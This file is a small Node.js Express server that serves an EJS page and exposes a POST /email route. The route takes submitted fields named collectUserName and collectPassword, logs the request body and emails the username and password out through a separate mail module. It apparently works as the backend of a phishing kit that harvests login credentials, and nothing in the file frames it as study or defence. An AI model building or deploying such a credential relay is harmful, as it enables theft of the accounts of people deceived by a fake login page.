const PORT = 3000

const express = require('express')
const path = require('path')
const cors = require('cors')

const sendMail = require('./mail')

const app = express()

app.set('view-engine', 'ejs')

app.use(express.static('views'));
app.use('/img', express.static(__dirname + 'public/img'))

//data parsing
app.use(express.urlencoded({
    extended: false
}))
app.use(express.json())
app.use(cors())


app.post('/email', (req,res) => {
    const {collectUserName, collectPassword} = req.body
    console.log('Data:', req.body)

    sendMail(collectUserName, collectPassword, function(err, data) {
        if (err) {
            res.status(500).json({message: 'internal error',err})
        }else{
            res.json({message:'Email Sent!'})
        }
    })

})


//Router to render html
app.get('/', (req,res)=> {
    res.render('index.ejs')
})

app.listen(PORT, () => console.log('server running'))